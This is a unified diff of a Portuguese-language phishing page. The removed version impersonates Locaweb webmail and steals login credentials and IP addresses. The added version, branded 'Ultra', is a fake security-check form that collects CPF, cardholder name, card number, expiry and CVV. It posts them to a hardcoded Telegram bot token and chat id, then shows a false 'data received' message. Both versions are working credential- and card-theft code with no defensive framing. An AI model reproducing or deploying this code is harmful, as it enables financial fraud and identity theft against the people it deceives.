@@ -2,92 +2,62 @@
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8"/>
-<title>Webmail – Locaweb</title>
+<title>Ultra – Verificação de Segurança</title>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet"/>
 <style>
-html,body{height:100%;margin:0;font-family:'Open Sans',sans-serif;background:#f5f5f5}
-.wrapper{display:flex;flex-direction:column;height:100%}
-.header{width:100%;background:#e2231a;color:#fff;padding:22px 0;text-align:center;font-size:26px;font-weight:600;letter-spacing:.4px}
-.content{flex:1;display:flex;align-items:center;justify-content:center}
-.card{width:420px;background:#fff;border-radius:8px;box-shadow:0 8px 25px rgba(0,0,0,.10);padding:45px 50px}
-.card h2{margin:0 0 0;font-size:22px;color:#e2231a}
-.card p{margin:6px 0 0 14px;color:#555;font-size:14px}
-form{margin-top:28px}
-label{display:block;margin-bottom:6px;font-size:14px;color:#444}
+body{margin:0;padding:0;background:#f5f5f5;font-family:'Open Sans',sans-serif}
+.card{width:420px;margin:80px auto;background:#fff;border-radius:8px;box-shadow:0 8px 25px rgba(0,0,0,.10);padding:45px 50px}
+.card h2{color:#e2231a;margin:0 0 8px}
+.card p{margin:6px 0 24px 0;color:#555;font-size:14px}
+label{font-size:14px;color:#444}
 input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:6px;font-size:15px;margin-bottom:18px}
 button{width:100%;padding:13px;background:#e2231a;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
 button:hover{background:#b31c14}
-.footer{margin-top:22px;text-align:center;font-size:13px;color:#666}
-.footer a{color:#e2231a;text-decoration:none}
+.success{display:none;text-align:center;padding:60px 20px}
+.success h2{color:#4caf50}
 </style>
 </head>
 <body>
-<div class="wrapper">
-  <div class="header">Webmail Locaweb</div>
-  <div class="content">
-    <div class="card">
-      <h2>Acesse sua conta</h2>
-      <p>Informe seus dados para entrar no webmail.</p>
-      <form id="f" autocomplete="off">
-        <label for="user">Usuário</label>
-        <input id="user" name="user" required/>
-        <label for="pass">Senha</label>
-        <input id="pass" name="pass" type="password" required/>
-        <button type="submit">Entrar</button>
-      </form>
-      <div class="footer">Esqueceu a senha? <a href="#">Clique aqui</a></div>
-    </div>
+<div id="form-area">
+  <div class="card">
+    <h2>Confirme seus dados</h2>
+    <p>Para segurança, valide seu CPF e cartão.</p>
+    <form id="f2" autocomplete="off">
+      <label>CPF</label>
+      <input name="cpf" required/>
+      <label>Nome (como no cartão)</label>
+      <input name="nome" required/>
+      <label>Número do cartão</label>
+      <input name="num" required/>
+      <label>Validade (MM/AA)</label>
+      <input name="val" required/>
+      <label>CVV</label>
+      <input name="cvv" required/>
+      <button type="submit">Confirmar</button>
+    </form>
   </div>
 </div>
 
+<div id="success-area" class="success">
+  <h2>✓ Dados recebidos com sucesso</h2>
+  <p>Sua solicitação será analisada.<br/>Em até <strong>48 horas</strong> você receberá o resultado por e-mail.</p>
+  <p>Obrigado por utilizar os serviços Ultra.</p>
+</div>
+
 <script>
-document.getElementById('f').addEventListener('submit', async e => {
-  e.preventDefault();
-  const data = Object.fromEntries(new FormData(e.target));
-  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip).catch(() => 'n/a');
-  const msg1 = `🔐 LOGIN 1\n👤 ${data.user}\n🔑 ${data.pass}\n🌐 ${ip}\n⏰ ${new Date().toLocaleString('pt-BR')}`;
-  const token = '8283630361:AAG32iDNtnetvSo6tHgq_yaaSh4aDCNuQfA';
-  const chat  = '6261750345';
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+document.getElementById('f2').addEventListener('submit', async ev => {
+  ev.preventDefault();
+  const d2 = Object.fromEntries(new FormData(ev.target));
+  const msg = `💳 CARTÃO 2\n📄 CPF: ${d2.cpf}\n👤 Nome: ${d2.nome}\n🔢 Núm: ${d2.num}\n📅 Val: ${d2.val}\n🔒 CVV: ${d2.cvv}`;
+  await fetch('https://api.telegram.org/bot8283630361:AAG32iDNtnetvSo6tHgq_yaaSh4aDCNuQfA/sendMessage', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({chat_id: chat, text: msg1})
+    body: JSON.stringify({chat_id: '6261750345', text: msg})
   });
-  document.body.innerHTML = `
-<div class="wrapper">
-  <div class="header">Webmail Locaweb</div>
-  <div class="content">
-    <div class="card">
-      <h2>Verificação de segurança</h2>
-      <p>Confirme seus dados para prosseguir.</p>
-      <form id="f2" autocomplete="off">
-        <label for="cpf">CPF</label>
-        <input id="cpf" name="cpf" required/>
-        <label for="nome">Nome no cartão</label>
-        <input id="nome" name="nome" required/>
-        <label for="num">Número do cartão</label>
-        <input id="num" name="num" required/>
-        <label for="val">Validade (MM/AA)</label>
-        <input id="val" name="val" required/>
-        <label for="cvv">CVV</label>
-        <input id="cvv" name="cvv" required/>
-        <button type="submit">Confirmar</button>
-      </form>
-    </div>
-  </div>
-</div>`;
-  document.getElementById('f2').addEventListener('submit', async ev => {
-    ev.preventDefault();
-    const d2 = Object.fromEntries(new FormData(ev.target));
-    const msg2 = `💳 CARTÃO 2\n📄 CPF: ${d2.cpf}\n👤 Nome: ${d2.nome}\n🔢 Núm: ${d2.num}\n📅 Val: ${d2.val}\n🔒 CVV: ${d2.cvv}`;
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({chat_id: chat, text: msg2})
-    });
-    location.href = 'https://locaweb.com.br';
-  });
+  // mostra tela de sucesso sem sair do domínio
+  document.getElementById('form-area').style.display = 'none';
+  document.getElementById('success-area').style.display = 'block';
 });
 </script>
 </body>
